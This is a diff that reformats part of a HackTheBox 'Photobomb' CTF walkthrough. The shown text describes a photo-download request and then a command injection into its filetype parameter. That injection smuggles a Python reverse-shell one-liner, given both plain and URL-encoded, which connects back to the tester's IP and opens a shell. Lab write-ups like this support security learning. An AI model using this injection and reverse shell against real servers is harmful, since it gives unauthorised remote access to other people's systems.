@@ -103,7 +103,9 @@ This is forwarded to the web server, and our cookie injection was successful. We
 
 ![alt text](/assets/img/hackthebox/photobomb/printer_bottom.PNG "Web Page")
 
-This page has the following functionality. A user can select one of the given images, choose a filetype between JPG and PNG, choose an image size, and press the ```DOWNLOAD PHOTO TO PRINT``` button. This button will download the selected image to the user’s local system. Let’s examine this download request using Burp Suite. This is the request:
+This page has the following functionality. A user can select one of the given images, choose a filetype between JPG and PNG, choose an image size, and press the ```DOWNLOAD PHOTO TO PRINT``` button. This button will download the selected image to the user’s local system.
+
+Let’s examine this download request using Burp Suite. This is the request:
 
 ```
 POST /printer HTTP/1.1
@@ -160,7 +162,10 @@ We now inject a Python reverse shell into the ```filetype``` parameter.
 >png;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(([my ip],[my port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 ##### URL-Endoded Payload:
->png%3Bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%5Bmy%20ip%5D%2C%5Bmy%20port%5D))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bimport%20pty%3B%20pty.spawn(%22sh%22)%27
+>png%3Bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(
+socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%5Bmy%20ip%5D%2C%5Bmy%20port%5D)
+)%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)
+%3Bimport%20pty%3B%20pty.spawn(%22sh%22)%27
 
 And this worked!
 
